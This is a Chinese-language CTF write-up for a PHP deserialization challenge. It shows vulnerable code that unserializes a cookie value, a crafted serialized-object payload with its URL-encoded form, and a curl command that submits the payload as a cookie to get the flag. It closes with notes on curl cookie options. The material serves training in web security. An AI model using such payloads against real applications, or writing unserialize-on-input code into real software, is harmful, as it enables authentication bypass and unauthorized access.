---
title: CTF之PHP反序列化3
date: 2025-11-19 14:56:55
tags: 
    - CTF 
    - Web
    - 渗透测试
    - PHP
---

# PHP反序列化3

## 题目

序列化迷城 3：隐形守护者

铁柱来到了迷宫的最深处，这里由一个隐形的守护者把守着教授的终极秘密的线索。这个守护者比之前的系统更加狡猾，它不接受 GET 参数，而是从 COOKIE 中读取身份信息。铁柱必须先通过逆向工程找出正确的 COOKIE 参数名，然后构造能够欺骗守护者的序列化对象。这考验着铁柱对反序列化漏洞在不同输入点的综合运用能力，只有成功通过这一关，他才能揭开教授隐藏的最终秘密。

## 解题过程

打开网页发现和第二题一样：

```php
highlight_file(__FILE__);
error_reporting(0);
include("flag.php");
class mylogin
{
    var $user;
    var $pass;
    function __construct($user, $pass)
    {
        $this->user = $user;
        $this->pass = $pass;
    }
    function login()
    {
        if ($this->user == "daydream" and $this->pass == "ok") {
            return 1;
        }
    }
}
$a = unserialize($_COOKIE['param']);
if ($a->login()) {
    echo $flag;
}
```

思路参考第二题，只是把GET换成了COOKIE，payload依然是：

```php
O:7:"mylogin":2:{s:4:"user";s:8:"daydream";s:4:"pass";s:2:"ok";}
```

但是payload中`"`和`;`会破坏Cookie的结构，因此我们URL编码一下：

```php
O%3A7%3A%22mylogin%22%3A2%3A%7Bs%3A4%3A%22user%22%3Bs%3A8%3A%22daydream%22%3Bs%3A4%3A%22pass%22%3Bs%3A2%3A%22ok%22%3B%7D
```

打开Firefox，按F12，找到Storage标签页，Cookies中点击`+`，Name栏输入`param`，Value为上面URL编码后的Payload，刷新网页得到flag

此时可以用curl命令：

```bash
curl -b 'param=O%3A7%3A%22mylogin%22%3A2%3A%7Bs%3A4%3A%22user%22%3Bs%3A8%3A%22daydream%22%3Bs%3A4%3A%22pass%22%3Bs%3A2%3A%22ok%22%3B%7D' http://题目/
```

## 科普

cURL用法：

```bash
curl -b / --cookie [COOKIE] [URL]
```

可以直接传入Cookie内容：

```bash
curl -b 'c=1' http://i.am.sb
```

传入多个Cookie：

```bash
curl -b 'c=1; v=fuck' http://i.am.sb
```

传入cookie.txt:

```bash
curl -b cookie.txt http://i.am.sb
```